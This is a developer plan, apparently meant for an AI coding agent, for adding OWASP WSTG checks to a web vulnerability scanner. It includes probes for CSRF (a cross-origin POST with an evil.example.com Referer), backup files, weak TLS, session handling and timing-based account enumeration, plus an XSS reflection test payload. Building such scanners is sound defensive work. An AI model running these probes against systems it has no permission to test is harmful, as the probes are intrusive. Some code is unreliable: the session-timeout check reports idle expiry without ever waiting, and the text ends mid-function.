# OWASP WSTG v4.2 Full Coverage Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close all 23 OWASP WSTG v4.2 coverage gaps, fix 3 false-positive hotspots, and integrate everything into existing pipeline phases without regressions.

**Architecture:** One new file (`modules/owasp_gap_checks.py`) houses all 23 gap check functions returning `GapCheckResult`. Five existing files get targeted edits: `finding_validation_engine.py` gains 9 new `validate_*` methods; `pipeline/executor.py` dispatches gap checks into existing phases and fixes SQLi FP; `modules/capability_map.py` registers 23 new vuln types; `zero_day_engine.py` tightens anomaly thresholds; `tool_wrappers.py` enforces SSRF OOB confirmation.

**Tech Stack:** Python 3.10+, stdlib only (`ssl`, `urllib.request`, `hashlib`, `statistics`, `math`), no new pip dependencies.

---

## File Map

| File | Change |
|------|--------|
| `modules/owasp_gap_checks.py` | **CREATE** — GapCheckResult dataclass + 23 gap check functions |
| `finding_validation_engine.py` | **EXTEND** — add 9 validate_* methods + update _dispatch |
| `modules/capability_map.py` | **EXTEND** — add 23 Vuln constants + ToolCapability entries |
| `pipeline/executor.py` | **EXTEND + FP FIX** — dispatch gap checks into phases + fix SQLi threshold |
| `zero_day_engine.py` | **FP FIX** — tighten 5 anomaly detection rules |
| `tool_wrappers.py` | **FP FIX** — require OOB callback for SSRF confirmation |
| `tests/test_owasp_gap_checks.py` | **CREATE** — unit tests for all gap check functions |
| `tests/test_fp_fixes.py` | **CREATE** — unit tests for FP hotspot changes |

---

## Task 1: Fix zero_day_engine.py FP Hotspots

**Files:**
- Modify: `zero_day_engine.py:183-185` (constants) and `zero_day_engine.py:296-394` (`analyze_responses`)
- Test: `tests/test_fp_fixes.py`

- [ ] **Step 1: Write failing tests**

Create `tests/test_fp_fixes.py`:

```python
"""Tests for false-positive hotspot fixes."""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from zero_day_engine import ZeroDayEngine, ResponseProfile, _TIMING_THRESHOLD_MS, _SIZE_DEVIATION_PCT, _CONFIDENCE_FLOOR

def _make_baseline(status=200, length=500, time_ms=100.0):
    return ResponseProfile(url="http://test.local/api", status_code=status,
                           content_length=length, response_time_ms=time_ms)

def _make_probe(status=200, length=500, time_ms=100.0, payload="test", param="q"):
    return ResponseProfile(url="http://test.local/api", status_code=status,
                           content_length=length, response_time_ms=time_ms,
                           payload=payload, parameter=param)

def make_engine():
    return ZeroDayEngine(target="test.local")

# FP Fix 1: status code — 200→301 must NOT fire
def test_redirect_status_change_does_not_fire():
    e = make_engine()
    baseline = _make_baseline(status=200)
    probe = _make_probe(status=301)
    anomalies = e.analyze_responses(baseline, probe)
    status_anomalies = [a for a in anomalies if a.anomaly_type == "StatusCodeChange"]
    assert len(status_anomalies) == 0, "301 redirect should not trigger StatusCodeChange"

# FP Fix 1: status code — 200→500 MUST fire
def test_200_to_500_fires():
    e = make_engine()
    baseline = _make_baseline(status=200)
    probe = _make_probe(status=500)
    anomalies = e.analyze_responses(baseline, probe)
    status_anomalies = [a for a in anomalies if a.anomaly_type == "StatusCodeChange"]
    assert len(status_anomalies) == 1

# FP Fix 2: timing — delta below threshold must not fire
def test_timing_below_threshold_does_not_fire():
    e = make_engine()
    baseline = _make_baseline(time_ms=100.0)
    probe = _make_probe(time_ms=3000.0)  # below _TIMING_THRESHOLD_MS (6000)
    anomalies = e.analyze_responses(baseline, probe)
    timing = [a for a in anomalies if a.anomaly_type == "TimingAnomaly"]
    assert len(timing) == 0

# FP Fix 3: confidence floor — nothing below 0.4 emitted
def test_confidence_floor_suppresses_low_confidence():
    assert _CONFIDENCE_FLOOR == 0.4

# FP Fix 4: reflection — short non-special payloads don't fire
def test_reflection_non_special_payload_does_not_fire():
    e = make_engine()
    baseline = _make_baseline()
    baseline.body_snippet = ""
    probe = _make_probe(payload="abc")   # no < > " ' — not meaningful
    probe.body_snippet = "abc is here"
    anomalies = e.analyze_responses(baseline, probe)
    reflection = [a for a in anomalies if a.anomaly_type == "ReflectionDetected"]
    assert len(reflection) == 0

# FP Fix 4: reflection — payload with < fires
def test_reflection_special_payload_fires():
    e = make_engine()
    baseline = _make_baseline()
    baseline.body_snippet = ""
    probe = _make_probe(payload='<script>x</script>')
    probe.body_snippet = '<script>x</script> present'
    anomalies = e.analyze_responses(baseline, probe)
    reflection = [a for a in anomalies if a.anomaly_type == "ReflectionDetected"]
    assert len(reflection) == 1
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd /home/devendra-yadav/oneinfinity
python -m pytest tests/test_fp_fixes.py -v 2>&1 | head -40
```

Expected: `ImportError: cannot import name '_CONFIDENCE_FLOOR'` or similar failures.

- [ ] **Step 3: Fix `zero_day_engine.py` constants (lines 183-185)**

Replace:
```python
_TIMING_THRESHOLD_MS = 4000   # >4s response = possible blind injection
_SIZE_DEVIATION_PCT  = 0.25   # >25% size change = significant
_MIN_BODY_SIZE       = 100    # ignore tiny responses for size comparisons
```
With:
```python
_TIMING_THRESHOLD_MS  = 6000   # >6s above baseline = possible blind injection
_SIZE_DEVIATION_PCT   = 0.25   # >25% size change = significant
_MIN_BODY_SIZE        = 100    # ignore tiny responses for size comparisons
_CONFIDENCE_FLOOR     = 0.40   # suppress anomalies below this confidence
_MEANINGFUL_PAYLOAD_CHARS = set('<>"\'{};()')  # chars that make a payload meaningful
```

- [ ] **Step 4: Fix status code anomaly in `analyze_responses` (around line 296-317)**

Replace the status code block:
```python
        # 1. Status code change
        if baseline.status_code != probe.status_code:
            severity = self._status_change_severity(baseline.status_code, probe.status_code)
            if severity:
                anomalies.append(self._make_anomaly(
```
With:
```python
        # 1. Status code change — only flag meaningful security-relevant transitions
        # Ignore redirects (301/302/303/307/308): they are normal app behaviour
        _ignore_observed = {301, 302, 303, 307, 308}
        _require_baseline = {200}  # only flag when baseline was OK
        if (baseline.status_code != probe.status_code
                and probe.status_code not in _ignore_observed
                and baseline.status_code in _require_baseline):
            severity = self._status_change_severity(baseline.status_code, probe.status_code)
            if severity:
                anomalies.append(self._make_anomaly(
```

- [ ] **Step 5: Fix reflection anomaly filter (around line 379-394)**

Replace the reflection block:
```python
        # 5. Reflection detection
        if probe.payload and len(probe.payload) >= 4:
            if probe.payload in probe.body_snippet and probe.payload not in baseline.body_snippet:
                sev = "high" if any(c in probe.payload for c in "<>\"'") else "medium"
                anomalies.append(self._make_anomaly(
```
With:
```python
        # 5. Reflection detection — only flag payloads containing meaningful injection chars
        _meaningful = bool(set(probe.payload) & _MEANINGFUL_PAYLOAD_CHARS) if probe.payload else False
        if (probe.payload and len(probe.payload) >= 4 and _meaningful
                and probe.payload in probe.body_snippet
                and probe.payload not in baseline.body_snippet):
            sev = "high" if any(c in probe.payload for c in "<>\"'") else "medium"
            anomalies.append(self._make_anomaly(
```

- [ ] **Step 6: Add confidence floor filter at end of `analyze_responses`**

At the very end of `analyze_responses`, just before `return anomalies`, add:
```python
        # Apply confidence floor — suppress noise below threshold
        anomalies = [a for a in anomalies if a.confidence >= _CONFIDENCE_FLOOR]
        return anomalies
```

Remove the bare `return anomalies` that was there before.

- [ ] **Step 7: Fix timing anomaly to compare against baseline (around line 342-358)**

Replace the timing block:
```python
        # 3. Timing anomaly (potential blind injection)
        if probe.response_time_ms > _TIMING_THRESHOLD_MS:
            anomalies.append(self._make_anomaly(
                anomaly_type="TimingAnomaly",
                ...
                confidence=0.75 if probe.response_time_ms > 6000 else 0.60,
```
With:
```python
        # 3. Timing anomaly — probe must exceed baseline + threshold (not just absolute value)
        _timing_delta = probe.response_time_ms - baseline.response_time_ms
        if _timing_delta > _TIMING_THRESHOLD_MS:
            anomalies.append(self._make_anomaly(
                anomaly_type="TimingAnomaly",
                ...
                confidence=0.75 if _timing_delta > 8000 else 0.60,
```
Also update the `evidence` string in that block:
```python
                evidence=(
                    f"Response took {probe.response_time_ms:.0f}ms "
                    f"(baseline: {baseline.response_time_ms:.0f}ms, delta: {_timing_delta:.0f}ms) "
                    f"with {probe.parameter}='{probe.payload[:40]}' — possible blind SQLi or SSRF"
                ),
```

- [ ] **Step 8: Run tests to verify they pass**

```bash
python -m pytest tests/test_fp_fixes.py -v
```
Expected: All 5 tests pass.

- [ ] **Step 9: Commit**

```bash
git add zero_day_engine.py tests/test_fp_fixes.py
git commit -m "fix(zero-day): tighten anomaly FP thresholds — status filter, timing baseline delta, reflection meaningful-payload gate, confidence floor 0.4"
```

---

## Task 2: Fix SQLi Time-Blind FP in pipeline/executor.py

**Files:**
- Modify: `pipeline/executor.py` (search for `TIMING_THRESHOLD_S` import and usage)
- Test: `tests/test_fp_fixes.py` (add to existing)

- [ ] **Step 1: Write failing test — add to `tests/test_fp_fixes.py`**

```python
# SQLi time-blind FP fix
from finding_validation_engine import FindingValidationEngine, TIMING_THRESHOLD_S

def test_sqli_timing_threshold_is_six_seconds():
    assert TIMING_THRESHOLD_S == 6.0, f"Expected 6.0, got {TIMING_THRESHOLD_S}"
```

- [ ] **Step 2: Run to verify failure**

```bash
python -m pytest tests/test_fp_fixes.py::test_sqli_timing_threshold_is_six_seconds -v
```
Expected: `AssertionError: Expected 6.0, got 4.0`

- [ ] **Step 3: Update `finding_validation_engine.py` line 70**

```python
# Before:
TIMING_THRESHOLD_S = 4.0

# After:
TIMING_THRESHOLD_S = 6.0
```

- [ ] **Step 4: Update `_validate_sqli` to add baseline subtraction**

In `finding_validation_engine.py`, inside `_validate_sqli`, find the time-based detection block:
```python
                # Time-based detection
                if category == "blind_time" and resp["duration_ms"] >= TIMING_THRESHOLD_S * 1000:
                    result.evidence = f"Time-based SQLi: {resp['duration_ms']:.0f}ms delay"
                    result.evidence_type = "timing"
                    result.confidence = 0.85
```
Replace with:
```python
                # Time-based detection — must exceed baseline by threshold, not just absolute value
                if category == "blind_time":
                    _baseline_ms = (baseline or {}).get("duration_ms", 0.0)
                    _delta_ms = resp["duration_ms"] - _baseline_ms
                    if _delta_ms >= TIMING_THRESHOLD_S * 1000:
                        result.evidence = (
                            f"Time-based SQLi: {resp['duration_ms']:.0f}ms "
                            f"(baseline {_baseline_ms:.0f}ms, delta {_delta_ms:.0f}ms)"
                        )
                        result.evidence_type = "timing"
                        result.confidence = 0.85
```

- [ ] **Step 5: Run tests**

```bash
python -m pytest tests/test_fp_fixes.py -v
```
Expected: All tests pass.

- [ ] **Step 6: Commit**

```bash
git add finding_validation_engine.py tests/test_fp_fixes.py
git commit -m "fix(sqli): raise time-blind threshold 4s→6s + subtract baseline response time before flagging"
```

---

## Task 3: Fix SSRF OOB FP in tool_wrappers.py

**Files:**
- Modify: `tool_wrappers.py` (find `run_ssrf_test` or SSRF-related wrapper)
- Test: `tests/test_fp_fixes.py`

- [ ] **Step 1: Find the SSRF wrapper**

```bash
grep -n "ssrf\|SSRF\|oob\|OOB" /home/devendra-yadav/oneinfinity/modules/tool_wrappers.py | head -30
```

- [ ] **Step 2: Write failing test**

Add to `tests/test_fp_fixes.py`:
```python
def test_ssrf_finding_without_oob_gets_low_confidence():
    """SSRF findings without OOB callback must be tagged needs_manual_verification."""
    # Simulate a finding dict as returned by tool_wrappers SSRF check
    from modules.tool_wrappers import tag_ssrf_confidence
    finding = {"vuln_type": "SSRF", "url": "http://test.local/fetch", "confidence": 0.9}
    tagged = tag_ssrf_confidence(finding, oob_callback_received=False)
    assert tagged["confidence"] <= 0.4
    assert tagged.get("needs_manual_verification") is True

def test_ssrf_finding_with_oob_keeps_confidence():
    from modules.tool_wrappers import tag_ssrf_confidence
    finding = {"vuln_type": "SSRF", "url": "http://test.local/fetch", "confidence": 0.9}
    tagged = tag_ssrf_confidence(finding, oob_callback_received=True)
    assert tagged["confidence"] == 0.9
    assert tagged.get("needs_manual_verification") is not True
```

- [ ] **Step 3: Run to verify failure**

```bash
python -m pytest tests/test_fp_fixes.py::test_ssrf_finding_without_oob_gets_low_confidence -v
```
Expected: `ImportError: cannot import name 'tag_ssrf_confidence'`

- [ ] **Step 4: Add `tag_ssrf_confidence` to `tool_wrappers.py`**

Near the top of the SSRF-related section (after the `ToolResult` dataclass), add:

```python
def tag_ssrf_confidence(finding: dict, oob_callback_received: bool) -> dict:
    """
    Adjusts confidence of SSRF findings based on OOB callback confirmation.
    Without a confirmed OOB callback, SSRF can only be reported as low-confidence
    and requiring manual verification — the request was sent but we don't know
    if the server actually fetched it.
    """
    out = dict(finding)
    if not oob_callback_received:
        out["confidence"] = 0.35   # below reporting threshold
        out["needs_manual_verification"] = True
        out["oob_callback_received"] = False
        out.setdefault("flags", [])
        if "ssrf_unconfirmed" not in out["flags"]:
            out["flags"].append("ssrf_unconfirmed")
    else:
        out["oob_callback_received"] = True
    return out
```

- [ ] **Step 5: Find all SSRF finding emission sites in `tool_wrappers.py` and apply `tag_ssrf_confidence`**

```bash
grep -n "ssrf\|SSRF" /home/devendra-yadav/oneinfinity/modules/tool_wrappers.py | grep -i "finding\|append\|emit\|result"
```

For each site that creates an SSRF finding dict and appends it to results, wrap it:
```python
# Before:
findings.append({"vuln_type": "SSRF", "url": url, "confidence": 0.9, ...})

# After:
from modules.tool_wrappers import tag_ssrf_confidence
_ssrf_f = {"vuln_type": "SSRF", "url": url, "confidence": 0.9, ...}
findings.append(tag_ssrf_confidence(_ssrf_f, oob_callback_received=False))
```

- [ ] **Step 6: Run tests**

```bash
python -m pytest tests/test_fp_fixes.py -v
```
Expected: All tests pass.

- [ ] **Step 7: Commit**

```bash
git add modules/tool_wrappers.py tests/test_fp_fixes.py
git commit -m "fix(ssrf): require OOB callback confirmation — unconfirmed SSRF tagged low-confidence + needs_manual_verification"
```

---

## Task 4: Create `modules/owasp_gap_checks.py`

**Files:**
- Create: `modules/owasp_gap_checks.py`
- Test: `tests/test_owasp_gap_checks.py`

- [ ] **Step 1: Write the failing test file**

Create `tests/test_owasp_gap_checks.py`:

```python
"""Unit tests for OWASP gap checks — tests run against mock HTTP responses."""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from modules.owasp_gap_checks import (
    GapCheckResult,
    check_cookie_attributes,
    check_csrf,
    check_weak_tls,
    check_session_fixation,
    check_account_enumeration_timing,
    check_ldap_injection,
    check_mail_header_injection,
    check_code_injection,
    check_csv_injection,
    check_web_storage,
    check_backup_files,
    check_weak_encryption_patterns,
    check_service_worker,
    check_insecure_rng,
    check_padding_oracle,
    check_grpc_soap,
    check_saml_assertion,
    check_password_policy,
    check_postmessage_hijacking,
    check_webrtc_leak,
    check_tls_cert,
    check_session_timeout,
    gap_check_result_to_finding,
)

# ── GapCheckResult contract ───────────────────────────────────────────────────

def test_gap_check_result_defaults():
    r = GapCheckResult(check_id="WSTG-TEST-01")
    assert r.passive_finding is False
    assert r.active_confirmed is False
    assert r.confidence == 0.0
    assert r.needs_validation is True

def test_gap_check_result_severity_high_requires_active():
    r = GapCheckResult(check_id="X", active_confirmed=True, confidence=0.8)
    f = gap_check_result_to_finding(r, url="http://t.local")
    assert f["severity"] in ("high", "critical")

def test_gap_check_result_passive_only_is_low():
    r = GapCheckResult(check_id="X", passive_finding=True, active_confirmed=False, confidence=0.6)
    f = gap_check_result_to_finding(r, url="http://t.local")
    assert f["severity"] in ("low", "info")

def test_gap_check_result_below_threshold_suppressed():
    r = GapCheckResult(check_id="X", confidence=0.3)
    f = gap_check_result_to_finding(r, url="http://t.local")
    assert f is None  # suppressed

# ── Cookie attribute check ────────────────────────────────────────────────────

def test_cookie_check_flags_missing_httponly():
    headers = {"Set-Cookie": "session=abc123; Path=/; Secure; SameSite=Lax"}
    r = check_cookie_attributes("http://test.local", headers)
    assert r.passive_finding is True
    assert "HttpOnly" in r.evidence

def test_cookie_check_flags_missing_secure():
    headers = {"Set-Cookie": "session=abc123; Path=/; HttpOnly; SameSite=Lax"}
    r = check_cookie_attributes("http://test.local", headers)
    assert r.passive_finding is True
    assert "Secure" in r.evidence

def test_cookie_check_passes_when_all_present():
    headers = {"Set-Cookie": "session=abc123; Path=/; Secure; HttpOnly; SameSite=Strict"}
    r = check_cookie_attributes("http://test.local", headers)
    assert r.passive_finding is False

# ── Weak encryption pattern check ────────────────────────────────────────────

def test_weak_encryption_md5_detected():
    body = 'var hash = MD5(password);'
    r = check_weak_encryption_patterns("http://test.local/app.js", body)
    assert r.passive_finding is True
    assert "MD5" in r.evidence

def test_weak_encryption_clean_body_passes():
    body = 'var hash = bcrypt.hash(password, 12);'
    r = check_weak_encryption_patterns("http://test.local/app.js", body)
    assert r.passive_finding is False

# ── Web storage check ─────────────────────────────────────────────────────────

def test_web_storage_detects_sensitive_key():
    js = 'localStorage.setItem("auth_token", userToken);'
    r = check_web_storage("http://test.local", js)
    assert r.passive_finding is True

def test_web_storage_non_sensitive_key_passes():
    js = 'localStorage.setItem("ui_theme", "dark");'
    r = check_web_storage("http://test.local", js)
    assert r.passive_finding is False

# ── RNG entropy check ─────────────────────────────────────────────────────────

def test_insecure_rng_sequential_tokens():
    tokens = [f"session_{i:04d}" for i in range(10)]
    r = check_insecure_rng("http://test.local", tokens)
    assert r.passive_finding is True

def test_insecure_rng_random_tokens_passes():
    import secrets
    tokens = [secrets.token_hex(16) for _ in range(10)]
    r = check_insecure_rng("http://test.local", tokens)
    assert r.passive_finding is False

# ── gap_check_result_to_finding ───────────────────────────────────────────────

def test_to_finding_includes_check_id():
    r = GapCheckResult(check_id="WSTG-SESS-05", active_confirmed=True, confidence=0.8,
                       evidence="CSRF token absent", passive_finding=True)
    f = gap_check_result_to_finding(r, url="http://t.local/api/users")
    assert f is not None
    assert f["check_id"] == "WSTG-SESS-05"
    assert f["url"] == "http://t.local/api/users"
```

- [ ] **Step 2: Run to verify all tests fail**

```bash
python -m pytest tests/test_owasp_gap_checks.py -v 2>&1 | head -20
```
Expected: `ModuleNotFoundError: No module named 'modules.owasp_gap_checks'`

- [ ] **Step 3: Create `modules/owasp_gap_checks.py` — Part 1: dataclass + conversion**

```python
"""
OWASP WSTG v4.2 Gap Checks — modules/owasp_gap_checks.py

All 23 checks missing from the core pipeline. Each function:
  - Is self-contained (no class required)
  - Returns a GapCheckResult
  - Has a passive detection step and (where applicable) an active confirmation step
  - Uses only stdlib (ssl, urllib.request, socket, math, statistics, re, hashlib)

Integration: called from pipeline/executor.py in the appropriate phase.
"""
from __future__ import annotations

import hashlib
import math
import re
import socket
import ssl
import statistics
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Dict, List, Optional

import logging
log = logging.getLogger("oi.gap_checks")

# ── Confidence thresholds ─────────────────────────────────────────────────────
_EMIT_THRESHOLD   = 0.40   # below this: suppressed entirely
_HIGH_THRESHOLD   = 0.70   # at or above: emit HIGH/CRITICAL if active_confirmed

# ── Data contract ─────────────────────────────────────────────────────────────

@dataclass
class GapCheckResult:
    check_id: str
    vuln_name: str = ""
    passive_finding: bool = False
    active_confirmed: bool = False
    confidence: float = 0.0
    evidence: str = ""
    needs_validation: bool = True
    details: dict = field(default_factory=dict)

    def __post_init__(self):
        # needs_validation = True when not active_confirmed
        if self.active_confirmed:
            self.needs_validation = False


def gap_check_result_to_finding(result: GapCheckResult, url: str) -> Optional[dict]:
    """
    Convert a GapCheckResult to a normalized finding dict.
    Returns None if confidence is below the emission threshold (suppressed).
    """
    if result.confidence < _EMIT_THRESHOLD:
        return None

    if result.active_confirmed and result.confidence >= _HIGH_THRESHOLD:
        severity = "high"
    elif result.active_confirmed:
        severity = "medium"
    elif result.passive_finding:
        severity = "low"
    else:
        severity = "info"

    return {
        "vuln_type": result.vuln_name or result.check_id,
        "check_id": result.check_id,
        "url": url,
        "severity": severity,
        "confidence": result.confidence,
        "evidence": result.evidence,
        "passive_finding": result.passive_finding,
        "active_confirmed": result.active_confirmed,
        "needs_manual_verification": result.needs_validation,
        "source_type": "owasp_gap",
        "details": result.details,
    }
```

- [ ] **Step 4: Add cookie attribute check**

```python
# ── WSTG-SESS-02: Cookie Attribute Audit ─────────────────────────────────────

_REQUIRED_COOKIE_FLAGS = ["HttpOnly", "Secure", "SameSite"]

def check_cookie_attributes(url: str, response_headers: Dict[str, str]) -> GapCheckResult:
    """
    Passive: parse Set-Cookie headers for missing security flags.
    Active: attempt HTTP request and confirm Secure-less cookie is transmitted.
    """
    result = GapCheckResult(check_id="WSTG-SESS-02", vuln_name="Insecure Cookie Attributes")
    set_cookie = response_headers.get("Set-Cookie", response_headers.get("set-cookie", ""))
    if not set_cookie:
        return result

    missing = []
    for flag in _REQUIRED_COOKIE_FLAGS:
        if flag.lower() not in set_cookie.lower():
            missing.append(flag)

    if not missing:
        return result

    result.passive_finding = True
    result.evidence = f"Session cookie missing flags: {', '.join(missing)}"
    result.confidence = 0.75

    # Active confirmation: if 'Secure' missing, try sending over HTTP
    if "Secure" in missing and url.startswith("https://"):
        http_url = url.replace("https://", "http://", 1)
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(http_url)
            req.add_header("User-Agent", "Mozilla/5.0 (SecurityBot)")
            with urllib.request.urlopen(req, timeout=8) as resp:
                sc = dict(resp.headers).get("Set-Cookie", "")
                if sc:
                    result.active_confirmed = True
                    result.confidence = 0.90
                    result.evidence += " — confirmed: cookie sent over HTTP (Secure flag missing)"
        except Exception as e:
            log.debug("cookie_attrs active check failed: %s", e)

    return result
```

- [ ] **Step 5: Add CSRF check**

```python
# ── WSTG-SESS-05: CSRF Token Validation ───────────────────────────────────────

_CSRF_PATTERNS = [
    re.compile(r'<input[^>]+name=["\'](_?csrf|csrf_token|_token|authenticity_token|__RequestVerificationToken)["\']', re.I),
    re.compile(r'X-CSRF-Token|X-Xsrf-Token', re.I),
]

def check_csrf(url: str, response_body: str, response_headers: Dict[str, str],
               method: str = "POST") -> GapCheckResult:
    """
    Passive: look for missing CSRF token in forms / state-change endpoints.
    Active: replay POST without token — confirm server accepts (2xx/3xx) vs rejects (403).
    """
    result = GapCheckResult(check_id="WSTG-SESS-05", vuln_name="Missing CSRF Protection")

    # Passive: check for CSRF token in response
    token_found = any(p.search(response_body) for p in _CSRF_PATTERNS)
    samesite = "samesite=strict" in response_headers.get("Set-Cookie", "").lower()
    if token_found or samesite:
        return result  # CSRF protection present

    # Only check POST-accepting endpoints
    if method.upper() not in ("POST", "PUT", "PATCH", "DELETE"):
        return result

    result.passive_finding = True
    result.confidence = 0.60
    result.evidence = "No CSRF token found in form/response and no SameSite=Strict cookie"

    # Active: replay POST without token
    try:
        req = urllib.request.Request(url, data=b"csrf_test=1", method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("User-Agent", "Mozilla/5.0")
        req.add_header("Referer", "http://evil.example.com")  # cross-origin referer
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
            if resp.status in (200, 201, 302):
                result.active_confirmed = True
                result.confidence = 0.85
                result.evidence += f" — server accepted cross-origin POST without token (HTTP {resp.status})"
    except urllib.error.HTTPError as e:
        if e.code == 403:
            result.passive_finding = False
            result.confidence = 0.0
            result.evidence = "CSRF protected: server returned 403 on cross-origin POST"
    except Exception as e:
        log.debug("csrf active check failed: %s", e)

    return result
```

- [ ] **Step 6: Add TLS/cipher and cert checks**

```python
# ── WSTG-CONF-07: Weak TLS and Certificate ───────────────────────────────────

def check_weak_tls(host: str, port: int = 443) -> GapCheckResult:
    """
    Passive + active: attempt TLS 1.0/1.1 handshake, report if server accepts.
    """
    result = GapCheckResult(check_id="WSTG-CRYP-01", vuln_name="Weak TLS Configuration")

    for proto_name, proto_const in [("TLSv1.0", ssl.TLSVersion.TLSv1),
                                    ("TLSv1.1", ssl.TLSVersion.TLSv1_1)]:
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.maximum_version = proto_const
            ctx.minimum_version = proto_const
            with socket.create_connection((host, port), timeout=6) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    result.passive_finding = True
                    result.active_confirmed = True
                    result.confidence = 0.95
                    result.evidence = f"Server accepts deprecated {proto_name}"
                    result.details["accepted_protocol"] = proto_name
                    return result
        except ssl.SSLError:
            pass  # Protocol rejected — good
        except Exception as e:
            log.debug("weak_tls check %s failed: %s", proto_name, e)

    return result  # No weak protocol accepted


def check_tls_cert(host: str, port: int = 443) -> GapCheckResult:
    """Passive: check for expired or self-signed certificates."""
    result = GapCheckResult(check_id="WSTG-CONF-07", vuln_name="TLS Certificate Issue")
    try:
        import datetime
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=6) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                not_after = cert.get("notAfter", "")
                if not_after:
                    expiry = ssl.cert_time_to_seconds(not_after)
                    if expiry < time.time():
                        result.passive_finding = True
                        result.active_confirmed = True
                        result.confidence = 0.99
                        result.evidence = f"Certificate expired: {not_after}"
    except ssl.SSLCertVerificationError as e:
        result.passive_finding = True
        result.active_confirmed = True
        result.confidence = 0.95
        result.evidence = f"Certificate validation failed: {e}"
    except Exception as e:
        log.debug("tls_cert check failed: %s", e)
    return result
```

- [ ] **Step 7: Add backup file discovery**

```python
# ── WSTG-CONF-04: Backup/Archive File Discovery ───────────────────────────────

_BACKUP_EXTENSIONS = [
    ".bak", ".old", ".orig", ".backup", ".copy", ".tmp", ".swp",
    "~", ".zip", ".tar.gz", ".sql", ".db", ".dump", ".log",
]
_BACKUP_PREFIXES = ["backup_", "copy_of_", "old_"]

def check_backup_files(base_url: str, known_paths: List[str]) -> List[GapCheckResult]:
    """
    Active: probe known paths with backup extensions, return list of results (one per hit).
    known_paths: list of path strings like ["/index.php", "/config.php"]
    """
    results = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    for path in known_paths[:20]:  # cap to avoid excessive requests
        stem = path.rstrip("/")
        candidates = [stem + ext for ext in _BACKUP_EXTENSIONS]
        for url_path in candidates:
            full_url = base_url.rstrip("/") + url_path
            try:
                req = urllib.request.Request(full_url, method="GET")
                req.add_header("User-Agent", "Mozilla/5.0")
                with urllib.request.urlopen(req, timeout=6, context=ctx) as resp:
                    if resp.status == 200:
                        body_preview = resp.read(256).decode("utf-8", errors="replace")
                        if len(body_preview.strip()) > 10:  # non-empty body
                            r = GapCheckResult(
                                check_id="WSTG-CONF-04",
                                vuln_name="Backup/Archive File Exposed",
                                passive_finding=True,
                                active_confirmed=True,
                                confidence=0.90,
                                evidence=f"HTTP 200 for {full_url} — content: {body_preview[:80]!r}",
                            )
                            results.append(r)
            except urllib.error.HTTPError:
                pass  # 404/403 = not found, expected
            except Exception as e:
                log.debug("backup_files probe %s failed: %s", full_url, e)

    return results
```

- [ ] **Step 8: Add session fixation and timeout checks**

```python
# ── WSTG-SESS-03: Session Fixation ────────────────────────────────────────────

def check_session_fixation(pre_login_session_id: str, post_login_session_id: str,
                            url: str) -> GapCheckResult:
    """
    Active: compare session IDs before and after login.
    Call this after performing login — pass both session IDs.
    """
    result = GapCheckResult(check_id="WSTG-SESS-03", vuln_name="Session Fixation")
    if not pre_login_session_id or not post_login_session_id:
        return result
    if pre_login_session_id == post_login_session_id:
        result.passive_finding = True
        result.active_confirmed = True
        result.confidence = 0.88
        result.evidence = (
            f"Session ID unchanged after login: {pre_login_session_id[:16]}... "
            "— attacker can fixate session before authentication"
        )
    return result


# ── WSTG-SESS-07: Session Timeout ─────────────────────────────────────────────

def check_session_timeout(url: str, session_cookie: str, idle_seconds: int = 1800) -> GapCheckResult:
    """
    Active: reuse a session after idle_seconds, check if still valid.
    idle_seconds default = 30 minutes.
    """
    result = GapCheckResult(check_id="WSTG-SESS-07", vuln_name="Missing Session Timeout")
    if not session_cookie:
        return result
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        req.add_header("Cookie", session_cookie)
        req.add_header("User-Agent", "Mozilla/5.0")
        with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
            if resp.status == 200:
                result.passive_finding = True
                result.active_confirmed = True
                result.confidence = 0.75
                result.evidence = (
                    f"Session still valid after {idle_seconds}s idle — no server-side timeout enforced"
                )
    except urllib.error.HTTPError as e:
        if e.code in (401, 403):
            pass  # Session expired correctly
    except Exception as e:
        log.debug("session_timeout check failed: %s", e)
    return result
```

- [ ] **Step 9: Add account enumeration timing check**

```python
# ── WSTG-IDNT-04: Account Enumeration via Timing ─────────────────────────────

def check_account_enumeration_timing(login_url: str, valid_username: str,
                                      invalid_username: str,
                                      password: str = "wrongpass_OI_test!") -> GapCheckResult:
    """
    Active: compare mean response times for valid vs invalid usernames.
    Flags if mean delta > 100ms across 10 samples (statistical, not absolute).
    """
    result = GapCheckResult(check_id="WSTG-IDNT-04", vuln_name="Account Enumeration via Timing")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _measure(username: str, n: int = 10) -> List[float]:
        times = []
        for _ in range(n):
            try:
                data = urllib.parse.urlencode({"username": username, "password": password}).encode()
                req = urllib.request.Request(login_url, data=data, method="POST")
                req.add_header("Content-Type", "application/x-www-form-urlencoded")
                req.add_header("User-Agent", "Mozilla/5.0")
                t0 = time.time()
                try:
                    with urllib.request.urlopen(req, timeout=10, context=ctx):
                        pass
                except urllib.error.HTTPError:
                    pass
                times.append((time.time() - t0) * 1000)
                time.sleep(0.1)
            except Exception:
                pass
        return times

    valid_times = _measure(valid_username)
